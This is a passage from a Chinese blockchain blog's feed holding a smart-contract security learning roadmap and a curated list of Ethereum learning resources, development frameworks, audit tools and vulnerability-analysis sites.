    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/audit/classic-vulnerabilities/" title="智能合约的经典漏洞">智能合约的经典漏洞</a></li><li><a href="/audit/open-source-audit-tools/" title="智能合约的审计工具">智能合约的审计工具</a></li><li><a href="/audit/smart-contract-learning-path/" title="智能合约安全学习路线">智能合约安全学习路线</a></li><li><a href="/audit/learning-resource/" title="智能合约学习资源">智能合约学习资源</a></li><li><a href="/audit/blockchian-study-material/" title="区块链相关学习材料">区块链相关学习材料</a></li></ol></blockquote><h2 id="前言">前言</h2><p>笔者相对擅长合约安全方面，因此这个学习路线大致是<strong>偏向于智能合约开发和智能合约安全</strong>，对于很多从事开发的朋友，可能显得比较学院派，不是那么切合工作实际，不过抛砖引玉，欢迎讨论和补充。学习的资源可以在下方的资源汇总中找到，笔者日后将会写合约审计方面的文章。</p><p>我们学习的心得、理论基础和源码分析，都会写在仓库里，欢迎交流学习</p><p><a href="https://github.com/learnerLj/geth-analyze">https://github.com/learnerLj/geth-analyze</a></p><p>这下面的内容笔者也没有完全掌握，但是会逐渐的学习，在未来 3-5 年研究生毕业后也许能够在合约安全、安全的区块链系统构建等方面有一定的成就。</p><h2 id="第一步：完成简单-DApp-开发">第一步：完成简单 DApp 开发</h2><p>一开始入门就要求做简单的 DApp 可能看起来不合理，因为读者可能现在都不知道 DApp 是什么。但是项目驱动的学习将会非常有效，并且掌握的开发技能将会在后续的学习中发挥重要作用。</p><p>将会学会的知识有：</p><ol><li><strong>编程语言：JavaScript, Solidity, (HTML, CSS)</strong></li></ol><p>完成前端与合约交互往往用的 JavaScript 的 API，这是必会的技能。JavaScript 也不必学的多深入，能够熟练的掌握 promis/async 之类的异步操作，编写函数和类即可。学习 JavaScript 对于编写合约的测试用例和一些重复工作的自动化非常有帮助。每次实验中不可能重复部署实验环境，而是一次编写，反复实验和调整。</p><p>Solidity 是编写智能合约最主流的语言，也将会是只能合约开发和智能合约安全的基础，是我们后续需要精通的语言。</p><p>至于 HTML 和 CSS 本身不难，和区块链关系不大，视自身情况学习，可以弱化。</p><ol start="2"><li><strong>Linux 的熟练使用</strong></li></ol><p>Linux 是以太坊客户端运行的主要系统环境，因为它相对于 windows 有更完善的命令行工具，过去的许多教程也是要么基于 MacOS，要么基于 Linux。这里推荐使用 Ubuntu 20.04 长期支持版，这是用的最多的带图形交互页面的 Linux 系统。</p><ol start="3"><li><strong>区块链入门知识</strong></li></ol><p>市面上关于区块链的书多如牛毛，笔者在刚入门时几乎借助 掌阅、微信读书等电子书平台和学校图书馆，读遍了所有中文书籍。可惜的是，笔者发现它们的内容稂莠不齐，甚至怀疑写书的人是否真的理解他所表达的内容，要么毫无洞见，要么写成教材式的死记硬背概念，少有佳作。笔者选出几本觉得还可以的书作为入门的阅读材料。</p><p>《精通以太坊》、《区块链架构之美——从比特币、以太坊、超级账本看区块链架构设计》《深入理解以太坊》是可以仔细阅读的，部分内容读不懂也没关系，可以会过来再读。</p><p>《深入浅出区块链核心技术与项目分析》、《深入以太坊智能合约开发》《区块链：以太坊 DApp 开发实战》值得略读，浏览内容，了解区块链的方方面面。其中《区块链：以太坊 DApp 开发实战》的中继服务器开发，值得以后掌握 Go 语言和具有一定的源码基础后尝试实践。</p><p>除此之外，可以<a href="https://www.zhihu.com/people/luo-jia-hao-34-25/columns">阅读笔者其他的文章</a>，会持续更新。也可以浏览下面的资源汇总，大致的看一遍，建立对区块链的模糊认识。</p><ol start="4"><li><strong>开发框架和库</strong></li></ol><p>实现 DApp 时交易使用 truffle 或者 hardhat 这样的集成开发框架。truffle 主要使用 web3.js 而 hardhat 主要使用 ether.js，这两个都可以，但是后者最近较为流行。</p><p>除了 web3.js 和 ether.js 这样的用 JavaScript 编写的完整的库外，还有其他语言编写的库，如 web3j、<a href="http://web3.py">web3.py</a>，但是建议和所使用的框架配套。</p><h2 id="第二部分：深入合约开发和合约安全">第二部分：深入合约开发和合约安全</h2><p>通过第一部分的学习，我们可以假设读者</p><ul><li>[ ] 能够在 Linux 命令行熟练使用框架.</li><li>[ ] 熟悉区块链的基本概念，包括区块、合约、账户、交易池、区块生成过程、交易的核心数据部分（如 <code>value</code>、<code>data</code>)、<code>receipt</code>、<code>gas</code>、基本了解 PoS 和 PoW 、最长链原则</li><li>[ ] 掌握编写合约的主要知识，例如 <code>receive</code> 函数 和 <code>fallback</code> 函数，编写合约的测试脚本。</li><li>[ ] 能够使用 geth 这样的客户端，搭建基本的网络</li><li>[ ] 知道在区块浏览器上查询信息</li></ul><p><strong>接下来开始了解区块链的相对高级的主体，注意偏向合约开发和合约安全方向：</strong></p><ul><li>[ ] 了解 ABI 的编码方式，并且能够使用 Solidity 内置的 ABI 相关函数。</li><li>[ ] 了解函数签名的生成方式以及在合约执行时的作用。</li><li>[ ] 了解预言机的确切含义，以及在链上的实现方式。</li><li>[ ] 理解以太坊虚拟机<ul><li>[ ] 了解交易发送到调用合约的整个过程。</li><li>[ ] 熟悉合约中的数据在存储中的组织形式、内存的组织形式、<code>calldata</code> 的组织形式。</li><li>[ ] 初步理解 Solidity 编译器的原理，能够读懂汇编</li></ul></li><li>[ ] 了解以太坊的字节码、操作码，能供单步调试，观察栈、内存的变化。</li><li>[ ] 了解合约的内联汇编，直接操作数据。</li><li>[ ] 根据自己的实际要求，选择是否需要熟悉各种业务代码，例如代币等等</li></ul><p><strong>然后，阅读以太坊的源码，建议阅读 geth，因为它时最主流也是最活跃的区块链项目。</strong></p><p>对于合约开发方向，深入底层似乎有些有些不必要了，但是对于合约安全来说，接下来的内容可能才算开始“入门”。</p><ul><li>[ ] 理解以太坊最重要的数据组织形式：状态树、收据树、交易树<ul><li>[ ] 掌握 Trie Tree、Patrica Tree、Merkle Tree 的数据结构基础。</li><li>[ ] 掌握重要的编码方式： HP 编码、 RLP 编码。</li></ul></li><li>[ ] 看懂源码中的 core 部分，从源码实现层次<ul><li>[ ] 理解区块链中的数据结构的确切定义和实现的方法。例如，从代码层次，掌握 <code>block</code>、<code>transction</code>、<code>log</code>、<code>receipt</code> 的定义和对应的方法。</li><li>[ ] 理解创世块的的生成方式</li><li>[ ] 看懂交易池（<strong>非常重要</strong>），例如交易排序、并发执行、交易广播实时更新数据</li><li>[ ] 看懂交易广播、区块形成过程等等</li></ul></li><li>[ ] 掌握合约的常见漏洞和审计工具的使用</li></ul><h2 id="第三部分：高级智能合约安全研究">第三部分：高级智能合约安全研究</h2><ul><li>[ ] 深入理解字节码，合约存储、链上和链下数据完整性和安全性方案</li><li>[ ] 掌握合约安全分析的方法，理解原理，包括<ul><li>[ ] 用机器学习方法分析</li><li>[ ] 符号执行方法</li><li>[ ] 模糊测试分析</li><li>[ ] 污点分析</li><li>[ ] 形式验证分析</li></ul></li><li>[ ] 掌握区块链系统态势感知模型，能够设计系统方案，动态、整体地监控链上数据，并且自动分析可能的安全威胁。</li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/audit/classic-vulnerabilities/&quot; title=&quot;智能合约的经典漏洞&quot;&gt;智能合约的经典漏洞&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/open-source-audit-tools/&quot; title=&quot;智能合约的审计工具&quot;&gt;智能合约的审计工具&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/smart-contract-learning-path/&quot; title=&quot;智能合约安全学习路线&quot;&gt;智能合约安全学习路线&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/learning-resource/&quot; title=&quot;智能合约学习资源&quot;&gt;智能合约学习资源&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/blockchian-study-material/&quot; title=&quot;区块链相关学习材料&quot;&gt;区块链相关学习材料&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;笔者相对擅长合约</summary>
        
      
    
    
    
    <category term="audit" scheme="https://www.blog-blockchain.xyz/categories/audit/"/>
    
    
    <category term="smart contract" scheme="https://www.blog-blockchain.xyz/tags/smart-contract/"/>
    
  </entry>
  
  <entry>
    <title>智能合约学习资源</title>
    <link href="https://www.blog-blockchain.xyz/audit/learning-resource/"/>
    <id>https://www.blog-blockchain.xyz/audit/learning-resource/</id>
    <published>2022-08-24T17:33:33.000Z</published>
    <updated>2024-11-18T09:48:15.779Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/audit/classic-vulnerabilities/" title="智能合约的经典漏洞">智能合约的经典漏洞</a></li><li><a href="/audit/open-source-audit-tools/" title="智能合约的审计工具">智能合约的审计工具</a></li><li><a href="/audit/smart-contract-learning-path/" title="智能合约安全学习路线">智能合约安全学习路线</a></li><li><a href="/audit/learning-resource/" title="智能合约学习资源">智能合约学习资源</a></li><li><a href="/audit/blockchian-study-material/" title="区块链相关学习材料">区块链相关学习材料</a></li></ol></blockquote><p>这些资源主要来自笔者的经历和学习，也参考了许多人的总结，作为自己的系统作结，应该对大家有帮助。</p><h3 id="帮助和交流平台">帮助和交流平台</h3><ul><li><a href="https://gitter.im/ethereum/home">gitter</a> 在线频道。</li><li><a href="https://www.reddit.com/r/ethereum/">reddit ethereum</a> 讨论区</li><li>以太坊的 <a href="https://ethereum.stackexchange.com/">stackexchange</a></li><li><a href="https://stackoverflow.com/">stackoverflow</a></li></ul><p>还有一些 discord 服务器，感兴趣可以加入。</p><h3 id="优质社区">优质社区</h3><ul><li><a href="https://www.ethereum.cn/">以太坊社区网络</a>，他们的文章整理的不错，<a href="https://www.ethereum.cn/develop">文档</a>也很好。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260152752.png" alt="202203111813924"></p><ul><li><p><a href="https://eth.wiki/">以太坊维基百科</a>，可以浏览基本的概念，很有帮助。</p></li><li><p><a href="https://blog.ethereum.org/">以太坊基金会博客</a>，可以得到很多前沿信息。</p></li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260153383.png" alt="202203120032607"></p><ul><li><a href="https://learnblockchain.cn/">登链社区</a>，许多翻译的文章质量很高，并且有一些文档翻译。</li><li><a href="https://learnblockchain.cn/eth/">以太坊知识库</a>，虽然许多东西没有更新，但是有些文章翻译的很好，例如 <a href="https://learnblockchain.cn/eth/basic.html">新手入门</a>、以及它开发者提供的<a href="https://learnblockchain.cn/eth/dev.html">参考</a> 都可以看出来是花了很长时间整理的，可以浏览，增长见识。比较可惜的是，后续没有继续更新，可能是小白成为大佬的过程常常写很多的文章，但是成为大佬后都应对复杂问题，就没有继续写下去了吧。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260153245.png" alt="202203111845175"></p><ul><li><a href="https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4">layer2 方案的备忘录</a>，以后深入以太坊拓展方案后可以很快对 layer2 有大致的认识。</li><li><a href="https://medium.com/">medium</a> 虽然是英文社区，但是里面的优秀文章写的很好，建议翻译慢慢看。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260153747.png" alt="202203111845710"></p><ul><li><a href="https://hackmd.io/@benjaminion">Eth2 展望和分享</a>，作者经常分享自己对以太坊升级的看法和资讯。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260153556.png" alt="202203111850716"></p><h3 id="入门参考">入门参考</h3><ul><li><a href="https://ethbook.abyteahead.com/index.html">《以太坊的指南针》 ‒ 以太坊的指南针 1.0.0 documentation</a> 面向 <strong>没接触过以太坊的人</strong> 的书。</li><li>以太坊的入门级<a href="https://www.kancloud.cn/qq393855529/ethereum/837511">简单文档</a></li><li><a href="https://zhuanlan.zhihu.com/p/331906800">区块链概念和基础</a>（基于比特币）</li><li><a href="https://ethereum.org/zh/developers/docs/">官方文档</a>，内容可能比较简洁，相对深入，可以量力而行。</li><li>《<a href="https://github.com/inoutcode/ethereum_book">精通以太坊</a>》前面的内容适合入门，后面的内容需要一定的基础，可日后再回顾。开源书，有中文版。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260154005.png" alt="cover"></p><h3 id="智能合约合约教程">智能合约合约教程</h3><ul><li><p><a href="https://solidity-by-example.org/">合约编写示例</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/459969916">笔者的笔记</a></p></li><li><p><a href="https://learnblockchain.cn/docs/solidity/index.html">中文文档</a></p></li><li><p><a href="https://cryptozombies.io/zh/">编游戏的同时学习以太坊 DApp 开发</a></p><p>虽然这个教程比较老，但是比较有趣</p><p><img src="https://cdn.blog-blockchain.xyz/202203260154077.png" alt="202203120033140"></p></li><li><p><a href="https://www.youtube.com/channel/UCJWh7F3AFyQ_x01VKzr9eyA">介绍 Solidity 细节的视频</a>（在 Youtube 上）</p></li><li><p><a href="https://www.youtube.com/c/%E7%90%86%E6%83%B3%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E9%99%A2">系统性的合约开发教程</a> （在 Youtube 上）</p></li></ul><h3 id="区块浏览器">区块浏览器</h3><ul><li><a href="https://etherscan.io/">Etherscan</a> – <em>中文、韩文、俄文和日文</em></li><li><a href="https://www.etherchain.org/">Etherchain</a></li><li><a href="https://ethplorer.io/">Ethplorer</a> - <em>支持中文、西班牙语、法语、土耳其语和俄语</em></li><li><a href="https://blockchair.com/ethereum">Blockchair</a> –<em>也有西班牙文、法文、意大利文、荷兰文、葡萄牙文、俄文、中文和波斯文</em></li><li><a href="https://blockscout.com/">Blockscout–区块链浏览器</a></li><li><a href="https://www.oklink.com/eth">OKLink</a></li><li><a href="https://beaconcha.in/">https://beaconcha.in/</a></li><li><a href="https://beaconscan.com/">https://beaconscan.com/</a></li><li><a href="https://eth2stats.io/medalla-testnet">https://eth2stats.io/</a></li><li><a href="https://ethscan.org/%EF%BC%88beaconcha.in">https://ethscan.org/（beaconcha.in</a> 的分叉）</li></ul><p>一些特殊的浏览器</p><ul><li><a href="https://watchtheburn.com/">统计被销毁的 ETH</a></li><li><a href="https://ethstats.net/">节点信息和链状态概览</a>。</li></ul><h3 id="合约库">合约库</h3><ul><li><a href="openzeppelin/contracts">openzeppelin/contracts</a> 提供了常见的合约库，实现了一些标准库，如 ERC20、ERC721，仓库中可阅读<a href="https://github.com/OpenZeppelin/openzeppelin-contracts">源码</a>。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260154449.png" alt="image-20220311114749585"></p><ul><li><a href="https://github.com/dapphub/dappsys">dappsys</a> 是一个新兴的合约库，用法参见文档<a href="https://dappsys.readthedocs.io/en/latest/">文档</a></li></ul><p>!<img src="https://cdn.blog-blockchain.xyz/202203260155751.png" alt="image-20220311114632238"></p><ul><li><a href="https://github.com/HQ20/contracts">HQ20</a> 里提供里许多的合约和他们的测试脚本，可以作为自己开发的组件。</li></ul><h3 id="集成开发工具">集成开发工具</h3><p><strong><a href="https://trufflesuite.com/index.html">Truffle+Ganache</a></strong></p><p>使用开发环境可以加快重复性任务，例如 Truffle 主要完成以下工作：</p><ul><li>编制合同</li><li>部署合约</li><li>调试合约</li><li>升级合约</li><li>运行单元测试</li></ul><p><img src="https://yos.io/assets/contract1.png" alt="松露框架"></p><p>Ganache 最近升级后功能强大了许多，可以提供本地私链的测试环境，而且还支持其他功能。</p><p><img src="https://yos.io/assets/contract3.png" alt="您可以在本地运行 Ganache 以加快开发速度。"></p><p>其次，truffle 有很多的插件，</p><ul><li><a href="https://github.com/rkalis/truffle-plugin-verify">truffle-plugin-verify</a> - 验证 Etherscan 上的特定地址的智能合约代码是否和本地相同</li><li><a href="https://github.com/ConsenSys/truffle-security">truffle -security</a> - 对智能合约运行 MythX 安全分析。</li><li><a href="https://github.com/IoBuilders/truffle-contract-size">truffle-contract-size</a> - 以千字节显示智能合约的大小。</li><li><a href="https://github.com/ChainSafe/truffle-plugin-abigen">truffle-plugin-abigen</a> - 生成与 Geth 兼容的<a href="https://github.com/ethereum/go-ethereum/wiki/Native-DApps:-Go-bindings-to-Ethereum-contracts">abigen</a>数据，用于为以太坊合约构建 Golang 绑定</li><li><a href="https://github.com/OpenZeppelin/openzeppelin-upgrades">openzeppelin-upgrades</a> 可升级合约插件</li><li><a href="https://github.com/sc-forks/solidity-coverage">solidity-coverage</a> 检查测试的覆盖性。</li></ul><p>官网中还介绍了其他的开发框架：</p><p><strong>Hardhat</strong></p><p>hardhat 的堆栈跟踪功能很强大，报错信息相对更具有可读性，而且主网分叉功能也很赞。</p><p><img src="https://cdn.blog-blockchain.xyz/202203260155107.png" alt="202203111538382"></p><ul><li><a href="https://hardhat.org/">hardhat.org</a>，除了官网也有国人不完全的<a href="https://learnblockchain.cn/docs/hardhat/getting-started/">翻译</a>。</li><li><a href="https://github.com/nomiclabs/hardhat">GitHub</a></li></ul><p>**Brownie - **基于 Python 的开发环境和测试框架。</p><ul><li><a href="https://eth-brownie.readthedocs.io/en/latest/">相关文档</a></li><li><a href="https://github.com/eth-brownie/brownie">GitHub</a></li></ul><p><strong>Embark -</strong> 开发环境、测试框架以及与以太坊、IPFS 和 Whisper 集成的其他工具。</p><p><img src="https://github.com/embarklabs/embark/raw/master/header.jpg" alt="Embark"></p><ul><li><a href="https://embark.status.im/docs/">相关文档</a></li><li><a href="https://github.com/embark-framework/embark">GitHub</a></li></ul><p><strong>Epirus -</strong> 在 JVM 上开发区块链应用程序的平台。</p><ul><li><a href="https://www.web3labs.com/web3j-sdk">主页</a></li><li><a href="https://docs.web3j.io/">相关文档</a></li><li><a href="https://github.com/web3j/web3j">GitHub</a></li></ul><p><strong>OpenZeppelin SDK -</strong> 工具包：一套帮助您开发、编译、升级、部署智能合约并与之交互的工具。</p><ul><li><p><a href="https://openzeppelin.com/sdk/">OpenZepelin SDK</a></p></li><li><p><a href="https://github.com/OpenZeppelin/openzeppelin-sdk">GitHub</a></p></li><li><p><a href="https://forum.openzeppelin.com/c/support/17">社区论坛</a></p></li><li><p><a href="https://github.com/PaulRBerg/create-eth-app/tree/develop/templates">https://github.com/PaulRBerg/create-eth-app/tree/develop/templates</a>)</p></li></ul><p><strong>The Graph -</strong> 链上信息查询的 API</p><ul><li><a href="https://thegraph.com/">网站</a></li><li><a href="https://ethereum.org/zh/developers/tutorials/the-graph-fixing-web3-data-querying/">使用教程</a></li></ul><p><strong>Alchemy -</strong> layer2 平台提供的开发套件。</p><ul><li><a href="https://www.alchemy.com/">alchemy.com</a></li><li><a href="https://github.com/alchemyplatform">GitHub</a></li><li><a href="https://discord.com/invite/A39JVCM">Discord</a></li></ul><p><strong>Dapptools -</strong> 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。</p><ul><li><a href="https://dapp.tools/">主页</a></li><li><a href="https://github.com/dapphub/dapptools/">GitHub</a></li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260155626.png" alt="202203111723295"></p><p>看官网朴实的介绍，确实很符合 unix 极简主义的哲学</p><p>关于其他集成开发工具的介绍，可以见 <a href="https://zhuanlan.zhihu.com/p/459165804">2022 十大智能合约开发工具</a></p><h3 id="与合约交互的库">与合约交互的库</h3><p><strong>Web3.js -</strong> 是使用的非常广泛的库，包含完整的合约交互和查询函数</p><ul><li><a href="https://web3js.readthedocs.io/en/1.0/">最新英文文档</a>，也有翻译的<a href="https://learnblockchain.cn/docs/web3.js/index.html">中文文档</a>。web3.js 经过了 0.2 到 1.0 的大版本更新，使用时需要注意用法的不同。</li><li><a href="https://github.com/ethereum/web3.js/">GitHub</a></li></ul><p><strong>Ethers.js -</strong> 现在的主流库，hardhat 框架也主要用到它。</p><ul><li><a href="https://docs.ethers.io/">文档</a></li><li><a href="https://github.com/ethers-io/ethers.js/">GitHub</a></li></ul><p><strong>Graph -</strong> 比较新的使用 GraphQL 的信息查询的库，配套有信息查询平台。</p><ul><li><a href="https://thegraph.com/">Graph</a></li><li><a href="https://thegraph.com/explorer/">Graph Explorer</a></li><li><a href="https://thegraph.com/docs/">相关文档</a></li><li><a href="https://github.com/graphprotocol/">GitHub</a></li></ul><p><strong>Alchemyweb3 -</strong> 封装后的 Web3.js 的库，Alchemy 的配套生态</p><ul><li><a href="https://docs.alchemyapi.io/documentation/alchemy-web3">相关文档</a></li><li><a href="https://github.com/alchemyplatform/alchemy-web3">GitHub</a></li></ul><p><strong>Web3j</strong> - Java 的 API</p><ul><li><a href="https://github.com/web3j/web3j">GitHub</a></li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260156360.png" alt="202203111544404"></p><p><strong><a href="http://Web3.py">Web3.py</a></strong> - 用于与以太坊交互的 Python 库</p><ul><li><a href="https://github.com/ethereum/web3.py">GitHub</a></li><li><a href="https://web3py.readthedocs.io/en/stable/">文档</a></li></ul><h3 id="DApp-的前端库">DApp 的前端库</h3><p>前端链接钱包往往需要阅读不同的钱包的文档，然后针对性的写代码，这是重复性的工作，因此有相应的库完成了这个工作。</p><ul><li><a href="https://www.blocknative.com/">blocknative</a> 不只提供了连接钱包的接口，而且还提供了监控内存池、交易池的接口。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260156353.png" alt="202203111537392"></p><ul><li><a href="https://github.com/Web3Modal/web3modal">web3modal</a> 提供链接钱包的 UI 和封装。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260156152.png" alt="202203121759262"></p><ul><li><p><a href="https://github.com/NoahZinsmeister/web3-react">web3-react</a> 为前端 React 提供的 DAPP 开发组件。</p></li><li><p><strong>创建 Eth App -</strong> 一大量的创建 DApp 的模板</p><ul><li><a href="https://github.com/paulrberg/create-eth-app">GitHub</a></li></ul></li><li><p><strong>Scaffold-Eth -</strong> Ethers.js + Hardhat + React 的 DApp 模板</p><ul><li><a href="https://github.com/austintgriffith/scaffold-eth">GitHub</a></li></ul><p><img src="https://user-images.githubusercontent.com/2653167/124158108-c14ca380-da56-11eb-967e-69cde37ca8eb.png" alt="image"></p></li><li><p><a href="https://trufflesuite.com/drizzle/">Drizzle</a> 擅长大量状态管理的前端库。</p><p><img src="https://cdn.blog-blockchain.xyz/202203260156387.png" alt="202203111808462"></p></li></ul><h3 id="安全审计">安全审计</h3><ul><li><a href="https://github.com/ConsenSys/mythril">Mythril</a> 是 EVM 字节码的安全分析工具。它使用符号执行、SMT 解决和污点分析来检测各种安全漏洞。</li><li><a href="https://github.com/crytic/slither">Slither</a> 是一个用 Python 3 编写的 Solidity 静态分析框架。</li><li><a href="https://github.com/trailofbits/manticore">Manticore</a> 是用于分析智能合约和二进制文件的符号执行工具。</li><li><a href="https://github.com/crytic/echidna">Echidna</a> 是一个 Haskell 程序，旨在对以太坊智能合约进行模糊测试/基于属性的测试。</li><li><a href="https://dashboard.tenderly.co/learnerL/project/forks">tenderly</a> 是集成、开发、测试模拟的平台，主网分叉的功能很赞。</li></ul><p>这方面的内容，我会在后续合约审计文章中详细说明各种工具的使用和原理。</p><h3 id="漏洞分析博客">漏洞分析博客</h3><ul><li><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU4ODQ3NTM2OA==&amp;action=getalbum&amp;album_id=1378653641065857025&amp;scene=173&amp;from_msgid=2247494336&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect">慢雾科技的安全技术探究</a> 里面会分享漏洞分析的报告。</li><li><a href="https://immunefi.com/">合约漏洞赏金平台 immunefi</a>，在上面提交漏洞报告，不仅可以得到丰厚的回报，也会收获行业声誉，也提供了<a href="https://immunefi.com/learn/">智能合约安全的教程</a>。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260157391.png" alt="202203121801287"></p><ul><li><a href="https://rekt.news/zh/">rekt</a> 是分享漏洞和攻击事件的平台。</li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260157401.png" alt="202203121801694"></p><ul><li><a href="https://swcregistry.io/">EIP-1470 提出的漏洞分类</a></li><li><a href="https://github.com/blockthreat/blocksec-ctfs">CTF 竞赛中合约安全方面的题目</a></li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260157897.png" alt="202203121733274"></p><ul><li><a href="https://github.com/blockthreat/blocksec-ctfs">找合约的漏洞的挑战</a></li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260157440.png" alt="202203121733995"></p><ul><li><a href="https://capturetheether.com/">合约安全游戏</a></li></ul><p><img src="https://cdn.blog-blockchain.xyz/202203260158651.png" alt="202203121735388"></p><h3 id="各语言的区块链开发">各语言的区块链开发</h3><p>以下资源包来自<a href="https://ethereum.org/zh/developers/docs/programming-languages/">以太坊官网</a>，主要是各种语言参与区块链开发的指导，虽然许多没有翻译，但是仍然很有参考意义，因此搬运过来了：</p><p>根据您的语言选择项目资源和虚拟社区：</p><ul><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/java/">面向 Java 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/python/">面向 Python 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/javascript/">面向 JavaScript 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/golang/">面向 Go 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/rust/">面向 Rust 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/dot-net/">面向 .NET 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/delphi/">面向 Delphi 开发者的以太坊资源</a></li><li><a href="https://ethereum.org/zh/developers/docs/programming-languages/dart/">面向 Dart 开发者的以太坊资源</a></li></ul><h3 id="底层源码参考">底层源码参考</h3><ul><li><a href="https://www.jianshu.com/u/572268941378">简书博客</a>，最初发表的文章主要是以太坊源码分析，对以太坊的函数做了说明。</li><li><a href="https://github.com/blockchainGuide/blockchainguide/tree/main/source_code_analysis/ethereum/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">最近的源码分析文章</a></li><li><a href="https://github.com/ZtesoftCS/go-ethereum-code-analysis">GitHub - ZtesoftCS/go-ethereum-code-analysis</a> 4 年前的源码分析汇总</li><li><a href="https://github.com/Billy1900/Ethereum-tutorial">Ethereum-tutorial</a></li><li>[go-ethereum 源码笔记（概览）](<a href="https://knarfeh.com/2018/03/10/go-ethereum">https://knarfeh.com/2018/03/10/go-ethereum</a> 源码笔记（概览）/) 四年前的博客</li><li><a href="https://goethereumbook.org/zh/">Introduction · Ethereum Development with Go</a> 跟着用 Go 写简单区块链</li><li><a href="https://geth.ethereum.org/docs/">Geth Documentation | Go Ethereum</a> geth 使用说明，调试程序，使用自带工具的参考。</li><li><a href="https://www.evm.codes/">操作码详解和模拟</a>。</li><li><a href="https://learnblockchain.cn/books/geth/">以太坊技术与实现</a>，作者作了整体性的说明，适合作为大致参考。</li><li><a href="https://github.com/learnerLj/geth-analyze">笔者的源码分析和理论基础、调试实操</a>。</li></ul><h2 id="参考资料">参考资料</h2><ul><li><a href="https://yos.io/2019/11/10/smart-contract-development-best-practices/">smart-contract-development-best-practices</a></li><li><a href="https://github.com/blockchainGuide/blockchainguide">https://github.com/blockchainGuide/blockchainguide</a></li><li><a href="https://ethereum.org/zh/">https://ethereum.org/zh/</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/audit/classic-vulnerabilities/&quot; title=&quot;智能合约的经典漏洞&quot;&gt;智能合约的经典漏洞&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/open-source-audit-tools/&quot; title=&quot;智能合约的审计工具&quot;&gt;智能合约的审计工具&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/smart-contract-learning-path/&quot; title=&quot;智能合约安全学习路线&quot;&gt;智能合约安全学习路线&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/learning-resource/&quot; title=&quot;智能合约学习资源&quot;&gt;智能合约学习资源&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/blockchian-study-material/&quot; title=&quot;区块链相关学习材料&quot;&gt;区块链相关学习材料&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;这些资源主要来自笔者的经历和学习，也参考了许多人的总结，</summary>
        
      
    
    
    
    <category term="audit" scheme="https://www.blog-blockchain.xyz/categories/audit/"/>
    
    
    <category term="smart contract" scheme="https://www.blog-blockchain.xyz/tags/smart-contract/"/>
    
  </entry>
  
  <entry>
    <title>交易的签名</title>
    <link href="https://www.blog-blockchain.xyz/geth/tx-signature/"/>
    <id>https://www.blog-blockchain.xyz/geth/tx-signature/</id>
    <published>2022-08-24T17:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
